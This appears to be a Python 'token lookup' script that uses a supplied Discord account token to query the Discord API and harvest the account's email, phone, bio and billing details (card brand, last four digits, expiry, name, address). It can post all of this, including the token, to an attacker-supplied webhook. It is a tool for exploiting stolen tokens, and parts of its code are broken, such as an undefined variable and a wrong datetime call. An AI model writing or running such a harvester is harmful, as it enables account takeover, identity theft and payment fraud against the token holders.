import requests, datetime

ask = input("Do you want to use a Webhook [y/n] > ")

if ask.lower() == "y":
    Webhook = input("Webhook Url > ")
if ask not in ["y", "n"]:
    input("Invalide Choice Retry !")
    exit()
else:
    pass

token = input("Token to look up > ")

auth = {
    'Authorization': token,
    'Content-Type': 'application/json'
}


req = requests.get("https://discordapp.com/api/v6/users/@me", headers=auth).json()
req2 = requests.get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers=auth).json()

pseudo = f'{req["username"]}'
tag = f'{req["discriminator"]}'
id = f'{req["id"]}'
id_avatar = f'{req["avatar"]}'
avatar = f'https://cdn.discordapp.com/avatars/{id}/{id_avatar}.gif'
bio = f'{req["bio"]}'
lang = f'{req["locale"]}'
email = f'{req["email"]}'
email_verif = f'{req["verified"]}'
num = f'{req["phone"]}'

if email_verif == "True":
    email_verif = "the token email is verified"
else:
    email_verif = "the token email is not verified"

for payement_info in requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=auth).json():
        type = payement_info["brand"]
        ccv = payement_info["last_4"]
        expire = f'{payement_info["expires_month"]}' + f'/{payement_info["expires_year"]}'
        info = payement_info['billing_address']
        name = info["name"]
        address = info["line_1"]
        city = info["city"]
        state = info["state"]
        country = info["country"]
        postal_code = info["postal_code"]


has_nitro = bool(len(req2) > 0)

if has_nitro:
    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
    nitro = abs((d2 - d1).days)
else:
    nitro = "No Nitro Found"   
      

if ask.lower() ==  "y":
    content = f"""
**User Info**
**Token:** `{token}`
**Pseudo:** `{pseudo + "#" + tag}`
**Id:** `{id}` 
**Avatar Url:** `{avatar}`
**Bio:** `{bio}`
**Country:** `{lang}`
**Email:** `{email}`
**Email Statut:** `{email_verif}`
**Phone:** `{num}`

**Payement Info**
**Card:** `{type}`
**Ccv:** `{ccv}`
**Expiration Date:** `{expire}`
**Name:** `{name}`
**Address:** `{address}`
**City:** `{city}`
**State:** `{state}`
**Postal Code:** `{postal_code}`

**Nitro Info**
**Nitro:** `{nitro}`
"""

else:    
    content = f"""
User Info
Token: {token}
Pseudo: {pseudo + "#" + tag}
Id: {id} 
Avatar Url: {avatar}
Bio: {bio}
Country: {lang}
Email: {email}
Email Statut: {email_verif}
Phone: {num}

Payement Info
Card: {type}
Ccv: {ccv}
Expiration Date: {expire}
Name: {name}
Address: {address}
City: {city}
State: {state}
Postal Code: {postal_code}

Nitro Info
Nitro: {nitro}
"""

data = {
    "content" : "@everyone",
    "avatar_url": "https://cdn.discordapp.com/attachments/1005237844161347607/1021002519029231657/pdp.jpg",
    "username": 'Token Look Up'
}

data["embeds"] = [
    {
        "title" : "Info token",
        "color": 16711680,
        "description": content
    }
]

if ask.lower() == "y":
    requests.post(Webhook, json = data)
    input("The information has been sent successfully !")
else:
    print(content)
